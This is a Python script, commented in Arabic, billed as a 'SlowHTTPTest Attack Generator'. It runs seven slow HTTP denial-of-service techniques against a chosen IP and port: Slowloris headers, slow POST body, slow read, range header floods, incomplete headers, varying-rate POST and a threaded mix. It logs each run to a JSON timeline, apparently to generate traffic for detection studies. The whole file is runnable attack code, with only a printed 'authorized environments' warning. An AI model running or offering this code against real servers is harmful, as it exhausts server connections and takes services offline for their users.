import threading
import time
import random
import string
import socket
import json
from datetime import datetime

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 80
LOG_FILE = "slowhttptest_timeline.json"

class SlowHTTPTestGenerator:
    """SlowHTTPTest Attack Generator"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacks = []
        self.connections_made = 0
        self.bytes_sent = 0
        self.stop_attack = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.connections_made = 0
        self.bytes_sent = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['connections_made'] = self.connections_made
        self.current_attack['bytes_sent'] = self.bytes_sent
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Connections: {self.connections_made}")
        print(f"[✓] Bytes sent: {self.bytes_sent}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("SLOWHTTPTEST ATTACK SUMMARY")
        print("="*60)
        
        total_connections = 0
        total_bytes = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Start: {attack['start_time']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Connections: {attack['connections_made']}")
            print(f"   Bytes: {attack['bytes_sent']}")
            
            total_connections += attack['connections_made']
            total_bytes += attack['bytes_sent']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total connections: {total_connections}")
        print(f"Total bytes: {total_bytes}")
        print("="*60)


def random_string(length):
    """توليد string عشوائي"""
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))


# ======== 1. Slow Headers (slowloris) ========
def slowhttptest_slow_headers(attacker, duration=60, connections=200):
    """Slow Headers - إرسال HTTP headers ببطء شديد"""
    attacker.log_attack_start("SLOWHTTPTEST_SLOW_HEADERS", 
                             "Slow HTTP headers (Slowloris technique)")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء اتصال بطيء"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إرسال بداية HTTP request
            initial_request = f"GET /{random_string(10)} HTTP/1.1\r\n"
            sock.send(initial_request.encode())
            
            attacker.connections_made += 1
            attacker.bytes_sent += len(initial_request)
            
            return sock
        except:
            return None
    
    
    print(f"  [*] Creating {connections} slow header connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
  
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} connections")
        
       
        for sock in list(sockets_list):
            try:
               
                header = f"X-{random_string(random.randint(5, 15))}: {random_string(random.randint(10, 30))}\r\n"
                sock.send(header.encode())
                attacker.bytes_sent += len(header)
            except:
                sockets_list.remove(sock)
        
        
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
      
        time.sleep(random.uniform(10, 15))
    
  
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 2. Slow Body (R-U-Dead-Yet) ========
def slowhttptest_slow_body(attacker, duration=60, connections=100):
    """Slow Body - إرسال POST body ببطء شديد (R-U-Dead-Yet)"""
    attacker.log_attack_start("SLOWHTTPTEST_SLOW_BODY", 
                             "Slow POST body (R-U-Dead-Yet)")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء POST request بطيء"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إنشاء POST request مع Content-Length كبير
            content_length = random.randint(1000000, 10000000)  # 1-10 MB
            
            request = f"POST /{random_string(10)} HTTP/1.1\r\n"
            request += f"Host: {attacker.target_ip}\r\n"
            request += "User-Agent: SlowHTTPTest\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {content_length}\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            attacker.connections_made += 1
            attacker.bytes_sent += len(request)
            
            return sock, content_length, 0  # socket, total_size, sent_size
        except:
            return None, 0, 0
    
    # إنشاء اتصالات أولية
    print(f"  [*] Creating {connections} slow body connections...")
    for _ in range(connections):
        sock, total, sent = create_socket()
        if sock:
            sockets_list.append({'socket': sock, 'total': total, 'sent': sent})
    
    print(f"  [*] Established {len(sockets_list)} POST connections")
    
    # إرسال body ببطء شديد
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} POST streams")
        
        # إرسال byte واحد أو اثنين لكل اتصال
        for conn in list(sockets_list):
            try:
                # إرسال بيانات قليلة جداً
                chunk_size = random.randint(1, 10)  # 1-10 bytes فقط!
                chunk = random_string(chunk_size)
                
                conn['socket'].send(chunk.encode())
                conn['sent'] += chunk_size
                attacker.bytes_sent += chunk_size
                
                # لو أرسلنا كل الـ body، نقفل الاتصال
                if conn['sent'] >= conn['total']:
                    conn['socket'].close()
                    sockets_list.remove(conn)
            except:
                sockets_list.remove(conn)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock, total, sent = create_socket()
            if sock:
                sockets_list.append({'socket': sock, 'total': total, 'sent': sent})
        
        # تأخير طويل بين كل إرسال (هنا السر!)
        time.sleep(random.uniform(5, 10))
    
    # إغلاق
    for conn in sockets_list:
        try:
            conn['socket'].close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 3. Slow Read ========
def slowhttptest_slow_read(attacker, duration=60, connections=100):
    """Slow Read - قراءة الـ response ببطء شديد"""
    attacker.log_attack_start("SLOWHTTPTEST_SLOW_READ", 
                             "Slow response reading")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء request وقراءة بطيئة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إرسال GET request عادي
            request = f"GET /{random_string(10)} HTTP/1.1\r\n"
            request += f"Host: {attacker.target_ip}\r\n"
            request += "User-Agent: SlowHTTPTest\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            attacker.connections_made += 1
            attacker.bytes_sent += len(request)
            
            return sock
        except:
            return None
    
    # إنشاء اتصالات
    print(f"  [*] Creating {connections} slow read connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # قراءة ببطء شديد
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} slow reads")
        
        # قراءة byte واحد فقط من كل اتصال
        for sock in list(sockets_list):
            try:
                # قراءة 1 byte فقط (بطيء جداً!)
                data = sock.recv(1)
                
                if not data:
                    # الاتصال انقطع
                    sockets_list.remove(sock)
            except socket.timeout:
                # timeout عادي - الاتصال لسه حي
                pass
            except:
                sockets_list.remove(sock)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        # تأخير طويل بين كل قراءة
        time.sleep(random.uniform(8, 12))
    
    # إغلاق
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 4. Range Headers Attack ========
def slowhttptest_range_attack(attacker, duration=60, connections=50):
    """Range Headers - طلب أجزاء كثيرة ببطء"""
    attacker.log_attack_start("SLOWHTTPTEST_RANGE", 
                             "Slow Range header attack")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء Range request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إنشاء Range header مع ranges كثيرة
            ranges = []
            for i in range(random.randint(100, 500)):
                start = random.randint(0, 10000000)
                end = start + random.randint(1, 100)
                ranges.append(f"{start}-{end}")
            
            range_header = ", ".join(ranges)
            
            # إرسال الـ request line و Host ببطء
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            time.sleep(random.uniform(5, 10))
            
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            time.sleep(random.uniform(5, 10))
            
            sock.send(f"Range: bytes={range_header}\r\n".encode())
            
            attacker.connections_made += 1
            attacker.bytes_sent += len(range_header) + 100
            
            return sock
        except:
            return None
    
    # إنشاء اتصالات
    print(f"  [*] Creating {connections} range connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # إرسال headers إضافية ببطء
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} range attacks")
        
        for sock in list(sockets_list):
            try:
                # إرسال header إضافي
                header = f"X-{random_string(10)}: {random_string(20)}\r\n"
                sock.send(header.encode())
                attacker.bytes_sent += len(header)
            except:
                sockets_list.remove(sock)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(random.uniform(10, 15))
    
    # إغلاق
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 5. Incomplete Headers ========
def slowhttptest_incomplete_headers(attacker, duration=60, connections=150):
    """Incomplete Headers - headers غير مكتملة"""
    attacker.log_attack_start("SLOWHTTPTEST_INCOMPLETE", 
                             "Incomplete HTTP headers")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء request بـ headers غير مكتملة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إرسال بداية request فقط
            sock.send(f"POST /{random_string(10)} HTTP/1.1\r\n".encode())
            time.sleep(1)
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            time.sleep(1)
            sock.send("Content-Type: application/x-www-form-urlencoded\r\n".encode())
            # لا نرسل Content-Length ولا ننهي الـ headers!
            
            attacker.connections_made += 1
            attacker.bytes_sent += 100
            
            return sock
        except:
            return None
    
    # إنشاء اتصالات
    print(f"  [*] Creating {connections} incomplete header connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # إبقاء الاتصالات معلقة
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} incomplete")
        
        # إرسال جزء صغير من header بدون إنهاء
        for sock in list(sockets_list):
            try:
                # إرسال جزء من header name فقط (بدون قيمة!)
                partial = f"X-{random_string(5)}"
                sock.send(partial.encode())
                attacker.bytes_sent += len(partial)
            except:
                sockets_list.remove(sock)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(random.uniform(12, 18))
    
    # إغلاق
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 6. Slow POST with Random Windows ========
def slowhttptest_slow_post_random(attacker, duration=60, connections=80):
    """Slow POST with Random Window Size"""
    attacker.log_attack_start("SLOWHTTPTEST_SLOW_POST_RANDOM", 
                             "Slow POST with varying send rates")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء POST مع window size عشوائي"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # تعيين send buffer صغير
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, random.randint(1024, 4096))
            
            sock.connect((attacker.target_ip, attacker.target_port))
            
            content_length = random.randint(500000, 2000000)
            
            request = f"POST /{random_string(10)} HTTP/1.1\r\n"
            request += f"Host: {attacker.target_ip}\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {content_length}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            attacker.connections_made += 1
            attacker.bytes_sent += len(request)
            
            return sock, content_length, 0
        except:
            return None, 0, 0
    
    # إنشاء اتصالات
    print(f"  [*] Creating {connections} slow POST connections...")
    for _ in range(connections):
        sock, total, sent = create_socket()
        if sock:
            sockets_list.append({'socket': sock, 'total': total, 'sent': sent})
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # إرسال بـ rates مختلفة
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Active: {len(sockets_list)} slow POSTs")
        
        for conn in list(sockets_list):
            try:
                # إرسال بحجم عشوائي (بطيء)
                chunk_size = random.randint(1, 50)
                chunk = random_string(chunk_size)
                
                conn['socket'].send(chunk.encode())
                conn['sent'] += chunk_size
                attacker.bytes_sent += chunk_size
                
                if conn['sent'] >= conn['total']:
                    conn['socket'].close()
                    sockets_list.remove(conn)
            except:
                sockets_list.remove(conn)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock, total, sent = create_socket()
            if sock:
                sockets_list.append({'socket': sock, 'total': total, 'sent': sent})
        
        # تأخير متغير
        time.sleep(random.uniform(3, 8))
    
    # إغلاق
    for conn in sockets_list:
        try:
            conn['socket'].close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 7. Mixed Slow Attacks ========
def slowhttptest_mixed(attacker, duration=60):
    """Mixed - كل تقنيات SlowHTTPTest مع بعض"""
    attacker.log_attack_start("SLOWHTTPTEST_MIXED", 
                             "Mixed slow HTTP techniques")
    
    # تشغيل كل التقنيات في نفس الوقت بـ threads
    attacks = [
        threading.Thread(target=lambda: slowhttptest_slow_headers(attacker, duration // 7, 50), daemon=True),
        threading.Thread(target=lambda: slowhttptest_slow_body(attacker, duration // 7, 30), daemon=True),
        threading.Thread(target=lambda: slowhttptest_slow_read(attacker, duration // 7, 30), daemon=True),
        threading.Thread(target=lambda: slowhttptest_range_attack(attacker, duration // 7, 20), daemon=True),
        threading.Thread(target=lambda: slowhttptest_incomplete_headers(attacker, duration // 7, 40), daemon=True),
    ]
    
    print("  [*] Launching mixed slow attacks...")
    
    for t in attacks:
        t.start()
    
    # انتظار كل الـ threads
    for t in attacks:
        t.join()
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SlowHTTPTest Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['headers', 'body', 'read', 'range', 
                               'incomplete', 'random', 'mixed', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    global TARGET_IP, TARGET_PORT
    TARGET_IP = args.target
    TARGET_PORT = args.port
    
    print("\n" + "="*60)
    print("SLOWHTTPTEST ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print(f"Timeline: {LOG_FILE}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Slow HTTP attacks are VERY effective!")
    print("⚠️  Use only in authorized environments!\n")
    
    input("Press ENTER to start attacks...")
    
    attacker = SlowHTTPTestGenerator(TARGET_IP, TARGET_PORT)
    
    try:
        if args.attack == 'headers':
            slowhttptest_slow_headers(attacker, args.duration)
        elif args.attack == 'body':
            slowhttptest_slow_body(attacker, args.duration)
        elif args.attack == 'read':
            slowhttptest_slow_read(attacker, args.duration)
        elif args.attack == 'range':
            slowhttptest_range_attack(attacker, args.duration)
        elif args.attack == 'incomplete':
            slowhttptest_incomplete_headers(attacker, args.duration)
        elif args.attack == 'random':
            slowhttptest_slow_post_random(attacker, args.duration)
        elif args.attack == 'mixed':
            slowhttptest_mixed(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('Slow Headers', slowhttptest_slow_headers, 60),
                ('Slow Body', slowhttptest_slow_body, 60),
                ('Slow Read', slowhttptest_slow_read, 60),
                ('Range Attack', slowhttptest_range_attack, 60),
                ('Incomplete Headers', slowhttptest_incomplete_headers, 60),
                ('Random POST', slowhttptest_slow_post_random, 60),
                ('Mixed', slowhttptest_mixed, 60),
            ]
            
            for name, attack_func, dur in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, dur)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()
        
        print("\n[✓] All attacks completed!")


if __name__ == "__main__":
    main()
